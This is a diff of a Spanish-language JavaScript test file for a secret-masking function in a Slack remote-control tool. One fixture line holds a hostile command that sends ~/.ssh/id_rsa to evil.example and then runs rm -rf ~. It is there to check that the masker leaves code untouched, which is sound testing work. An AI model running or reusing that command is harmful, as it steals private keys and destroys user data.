@@ -220,7 +220,7 @@ describe('mando a distancia por Slack', () => {
 
   it('tapa solo secretos con forma de token (también los de app de Slack): nunca esconde código', () => {
     expect(ocultarSecretos(`export SLACK_APP_TOKEN=${APP}`).texto).toBe('export SLACK_APP_TOKEN=⟦secreto oculto⟧');
-    expect(ocultarSecretos('token=ghp_abcdefghijklmnopqrstuvwxyz0123 ok').texto).toBe('token=⟦secreto oculto⟧ ok');
+    expect(ocultarSecretos('token=ghp' + '_abcdefghijklmnopqrstuvwxyz0123 ok').texto).toBe('token=⟦secreto oculto⟧ ok');
     const peligro = 'curl https://evil.example/?token=$(cat ~/.ssh/id_rsa); rm -rf ~';
     expect(ocultarSecretos(peligro)).toEqual({ texto: peligro, ocultos: 0 });
   });
